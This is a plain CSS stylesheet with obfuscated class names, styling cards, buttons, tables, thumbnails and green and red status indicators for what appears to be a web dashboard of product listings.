    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi {
        position: relative;
        padding-bottom: 38px
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI {
        position: relative;
        width: 268px;
        padding: 16px;
        background: #fff;
        border-radius: 4px;
        border: 1px solid #eaeaea
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI ._34HVJ2Djf6fT8xst4oElPe {
        font-size: 10px;
        color: #2e2e2e
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI ._1Yr3Sfr68vtIcQuvj7uHNd {
        font-size: 16px;
        font-weight: 500;
        color: #011627;
        margin-top: 15px
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI ._2voLYMAOkmHYGlG8kejRgs {
        color: #6d6d6d;
        margin-top: 10px
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI .ey39MPai-I1xDHKyuEu6V {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 16px
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI .ey39MPai-I1xDHKyuEu6V ._3BdH90C4o3tec6gW_2HvQt {
        color: #ababab;
        cursor: pointer
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI .ey39MPai-I1xDHKyuEu6V ._2KImlDkgGngdbTQ5TJTTR6 {
        padding: 5px 12px;
        background-color: #d5d5d5;
        border-radius: 3px;
        color: #011627;
        cursor: pointer
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI .ey39MPai-I1xDHKyuEu6V .eJVmSC-WFPFD5N3aqGGnW {
        padding: 4px 14px;
        background-color: #011627;
        border-radius: 3px;
        color: #fff;
        cursor: pointer;
        margin-left: 6px
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI ._1GSHXfLJa1zDBVmS8Jq8Qs {
        position: absolute;
        top: calc(100% - 2px);
        left: 34px;
        display: flex;
        justify-content: center;
        width: 1px;
        height: 38px;
        border-left: 1px dashed #e9162b
    }

    ._1405Qq0I1BH5-p6pYf1Nzc._20EQnPVmK0LrDS0p_3EVGi .VDPfnSH8Gj_GX35v9T3CI ._1GSHXfLJa1zDBVmS8Jq8Qs span {
        position: absolute;
        top: 0;
        left: -3px;
        width: 6px;
        height: 6px;
        background: #e9162b;
        border-radius: 50%;
        box-shadow: 0 0 0 6px rgba(233, 22, 43, 0.3)
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG {
        margin-top: 20px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE {
        display: table;
        width: 100%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl {
        display: table-header-group
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD {
        display: table-row
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y._2NvPqnvQNoshM-H_VDpM15 {
        width: 40%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y._1v9SkrrM5ykH8eOZa1QTtq {
        width: 15%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y._2UiFpoUEzA6ZUup6yK-QLI {
        width: 20%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y._2CHgjBq-aITT4CU8oL6_1D {
        width: 15%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y._2vrvNInpWnIzTyopVb_1fd {
        width: 15%
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE ._25Qv8pXJXBjykoDbHsqMYl ._2vdFLNsuF5G14LRsxctLaD ._2bMtUvsH5WIqhXzdIpH8_Y:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X {
        display: table-header-group
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD {
        display: table-row
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8._7wZeFKGiDSJuxI401nU4L * {
        cursor: pointer
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2hTH2KR6-jkl3Q4d6kAQX8 {
        width: 60px;
        height: 60px;
        border-radius: 4px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2XYMuQqSB-WWHll4cgXIjk {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2XYMuQqSB-WWHll4cgXIjk:hover {
        color: var(--ah-primary-hover)
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._3uMxUJnTXNbj29_WlvZpZE {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8.rXExbkRfM7VQITEkPjYPu>span {
        display: flex;
        align-items: center
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8.rXExbkRfM7VQITEkPjYPu>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._1y75_MwE9pxEx5JgYDSDuN,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._17g7oJ3GZ5YflyTO8Z-2VS {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._1y75_MwE9pxEx5JgYDSDuN svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._17g7oJ3GZ5YflyTO8Z-2VS svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._1y75_MwE9pxEx5JgYDSDuN svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._1y75_MwE9pxEx5JgYDSDuN path,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._17g7oJ3GZ5YflyTO8Z-2VS svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._17g7oJ3GZ5YflyTO8Z-2VS path {
        fill: #21a67a
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._3cWw0erAyI_-_OrtsNMNGs,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2foee831ip6pGYPy2kAW4J {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._3cWw0erAyI_-_OrtsNMNGs svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2foee831ip6pGYPy2kAW4J svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._3cWw0erAyI_-_OrtsNMNGs svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._3cWw0erAyI_-_OrtsNMNGs path,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2foee831ip6pGYPy2kAW4J svg,
    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._1PfYSxOH_PtFqEr_nw6cbE .Bzn3VkAZSwC7phX-8gZ2X ._2vdFLNsuF5G14LRsxctLaD ._3Yv12bDw0OSrst7r_GMCa8 ._2foee831ip6pGYPy2kAW4J path {
        fill: #e9162b
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._2hFPqUBvY2jJpMpg1wFkiS {
        padding: 20px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._2hFPqUBvY2jJpMpg1wFkiS div {
        cursor: pointer
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._2hFPqUBvY2jJpMpg1wFkiS span {
        color: #006fe3;
        font-weight: 600;
        display: flex;
        justify-content: center;
        cursor: pointer
    }

    ._2pMInzXyUVUL6boldqOGlR.I43hkPUpRHjIli0Wr4fCG ._2BuiQhJkkkjy9bd7nCgGdL {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf {
        margin-top: 20px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1HlwihxG2Pyg9OyBzsAsks {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1HlwihxG2Pyg9OyBzsAsks ._3bKkVLg5fcI0AqFt1_TDnf {
        display: inline-flex;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1HlwihxG2Pyg9OyBzsAsks ._3bKkVLg5fcI0AqFt1_TDnf .VYXqk7Kxkup8GV8hUnw26 {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._1HlwihxG2Pyg9OyBzsAsks:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px;
        border-bottom: 1px solid #e2e4e5
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3UEvrwhYjht3sUz8kTvlhH {
        display: flex
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3UEvrwhYjht3sUz8kTvlhH ._2Ldr2vWSmVYYkaU5SkWpE2 {
        display: inline-flex
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._3UEvrwhYjht3sUz8kTvlhH ._2LDvhmZXwQU1azgOMzMLpN {
        display: inline-flex;
        margin-left: 30px;
        cursor: pointer;
        color: #006fe3
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf .-n6zWl0EwWADM9MebPgFX {
        position: relative
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf .-n6zWl0EwWADM9MebPgFX ._31HXylbI_1XuBL9hHQntDS {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999999
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ {
        position: sticky;
        top: 0;
        padding-top: 20px;
        display: grid;
        grid-template-columns: 0.75fr 70px 1fr;
        padding-bottom: 10px;
        background: #fff;
        border-bottom: 1px solid #e2e4e5;
        z-index: 1000
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA {
        display: grid;
        grid-template-columns: 68px 1fr
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA ._2sV1_DVUQMG52vFSpQEg3Y {
        width: 68px;
        height: 68px;
        margin-right: 10px;
        display: flex;
        border-radius: 4px;
        overflow: hidden
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA ._2sV1_DVUQMG52vFSpQEg3Y img {
        max-width: 100%;
        width: 100%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA .RisLY_fEGdyuhF2olEyyo {
        padding-left: 10px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA .RisLY_fEGdyuhF2olEyyo .AqEhE6r661FDlewkphFBB {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA .RisLY_fEGdyuhF2olEyyo .AqEhE6r661FDlewkphFBB:hover {
        color: var(--ah-primary-hover)
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA .RisLY_fEGdyuhF2olEyyo .BQasIypWuTvreoP_zbqCB {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._3UBaRrVA0eVw0HgljDTLXA .RisLY_fEGdyuhF2olEyyo .BQasIypWuTvreoP_zbqCB span {
        display: inline-flex
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._1RhYPExfEm75MkPrKilRME {
        display: grid;
        grid-template-columns: 100px 100px 100px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._1RhYPExfEm75MkPrKilRME ._3qION1UC8Zn-F9BVoEuCzA {
        color: #2e2e2e
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2YNN68hMp7ijmGjaFCb9rJ ._1RhYPExfEm75MkPrKilRME ._4B11FVL3VH_SEUoyoA-0t {
        font-size: 14px;
        font-weight: 700;
        color: #2e2e2e
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._11bToGl1vncWX7Otk8FXvO {
        position: relative;
        padding-top: 20px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T {
        display: table;
        width: 100%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE {
        display: table-header-group
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU {
        display: table-row
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK._1ANdBQOxBgUMh2vsqhVmmb {
        width: 35%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK._2mZzQlOUKaYRNQXjmU7Rhr {
        width: 15%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK._1BxJkB-PfdojEOgVmeW8xe {
        width: 25%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK._1qZOQZCkV8go-3GnFYwp3N {
        width: 15%
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T ._3lQYKfHhFhAIOFrigEe1GE ._2tZiet0ttrxpKCCvyxkpFU ._3B5tDrpLO03XMU53-R5LGK:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo {
        display: table-header-group
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU {
        display: table-row
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77.FsO7cIzaT0kacync0uUXA * {
        cursor: pointer
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .CTejvzhBjaMA24Ka04ZBD {
        width: 32px;
        height: 32px;
        border-radius: 4px;
        overflow: hidden
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AqEhE6r661FDlewkphFBB {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .AqEhE6r661FDlewkphFBB:hover {
        color: var(--ah-primary-hover)
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._13hWhSfcz3hjGw5IKBvWaY {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77._1rDypfDbfDUEZ2S_VoiZPj>span {
        display: flex;
        align-items: center
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77._1rDypfDbfDUEZ2S_VoiZPj>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 .qXkrE-U7pm6zMVTQkNsim,
    ._2Ls7eEhz_977659_xjvmt7.f4-dxojCrhtGLDkvwSanf ._2TuXxgE7csV3Y8ZUekd77T .T0QPa7jsZj4xngVStODLo ._2tZiet0ttrxpKCCvyxkpFU ._3oqFoGfDAq8NtNaKu4Ve77 ._30CWiBAox7_rDMza7OyQ4X {
        color: #21a67a;
        display: flex;
        align-items: center
    }

